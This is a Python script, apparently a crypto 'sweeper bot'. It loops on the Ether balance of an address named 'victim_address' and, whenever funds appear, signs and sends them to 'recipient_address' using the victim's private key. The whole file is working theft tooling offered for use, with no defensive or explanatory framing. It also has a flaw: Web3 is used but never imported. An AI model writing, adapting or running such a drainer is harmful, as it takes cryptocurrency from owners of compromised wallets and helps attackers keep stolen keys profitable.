from typing import ByteString
from eth_utils.conversions import to_hex
from eth_utils.currency import from_wei

import json
import requests
from decimal import *
from config import *

if ganache_mode:
    web3 = Web3(Web3.HTTPProvider(ganache_url))
else:
    web3 = Web3(Web3.HTTPProvider(infura_url))

# check connecting web3 to Ganache
if  web3.isConnected() == True:
    print("started")
else :
    print("error connecting...")

balance=0

gas_fee = 21000*56  # You can change gasfee value
gas_fee = Decimal(gas_fee)
gas_fee = web3.fromWei(gas_fee,'Gwei')
print("gas fee is : ", gas_fee)
def get_balance_loop():
    balance=0
    while True:
        while 0.0005>balance:
            #Get balance account
            try:
                balance = web3.eth.getBalance(victim_address)
                balance = web3.fromWei(balance, "ether") #convert to ether value
            except:
                print("error , i can't get balance...")

        try:
            balance = balance-gas_fee
            print("ETH balance: ",balance)
            # print(balance)
            # print(web3.fromWei(balance, "ether"))
            build_transaction(balance)
        except:
            print("Error, check balance and Gasfee again")
            


def build_transaction(balance):
    try:
        #get nonce number
        nonce = web3.eth.getTransactionCount(victim_address)
        #build transaction
        tx = {
            'nonce':nonce,
            'to':recipient_address,
            'value':web3.toWei(balance,'ether'),
            'gas':21000,
            'gasPrice':web3.toWei('56','gwei')
        }

        #sign transaction with private key
        signed_tx = web3.eth.account.signTransaction(tx,victim_key)
        
        #send Transaction
        tx_hash= web3.eth.sendRawTransaction(signed_tx.rawTransaction)

        print(web3.toHex(tx_hash))
        print("Transaction Completed\n GET Balance Again...")
        get_balance_loop()
    except:
        print("ERROR, check buldTransction Funcation")

get_balance_loop()
